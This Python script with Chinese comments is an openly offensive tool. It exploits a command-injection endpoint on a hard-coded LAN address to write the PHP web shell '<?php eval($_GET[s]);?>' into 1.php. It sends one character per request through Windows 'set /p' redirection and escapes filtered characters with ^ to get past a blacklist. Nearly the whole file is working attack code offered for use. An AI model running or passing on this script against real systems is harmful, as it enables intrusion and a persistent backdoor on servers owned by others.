#Windows下写马脚本，用以命令拆分~

import requests
from loguru import logger

a='''

   _____                _       __          __         
  / ____|              | |      \ \        / /         
 | |  __ _ __ ___  __ _| |_ _____\ \  /\  / /_ _ _ __  
 | | |_ | '__/ _ \/ _` | __|______\ \/  \/ / _` | '_ \ 
 | |__| | | |  __/ (_| | |_        \  /\  / (_| | | | |
  \_____|_|  \___|\__,_|\__|        \/  \/ \__,_|_| |_|
                                                       
                                                       
'''
print(a)
b='''
欢迎使用万大侠的小工具~
使用过程中遇到任何问题欢迎PR！

详情请翻阅使用手册README.md


'''
print(b)







session=requests.Session()
#修改你想写马的内容
command=f'<?php eval($_GET[s]);?>'
#黑名单如果有遗漏自己添加哈
blacklist=['<','>','>>','@','[',']',';',':','(',')','$','&','|','&&','||','+','-','~','*','/','?']
def run(chuan):
  url = "http://192.168.85.142:80/"
  headers = {
    "Pragma": "no-cache",    
    "Cache-Control": "no-cache", 
    "Upgrade-Insecure-Requests": "1", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", 
    "Content-Type": "application/x-www-form-urlencoded", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9", 
    "Connection": "close"
    }
  data = {"cmd": chuan}
  try:
    res=session.post(url, headers=headers, data=data)
    print(res.text)
  except Exception as e:
    logger.exception(e)

def judge(c):
    if c in blacklist:
      run(f'set /p=^{c}<nul>>1.php')
    else:
      run(f'set /p={c}<nul>>1.php')

for i in range(0,len(command)):
  if i+1 != len(command) and command[i+1] == ' ':
    judge(command[i]+command[i+1])
  elif command[i] != ' ':
    judge(command[i])
  else:
    continue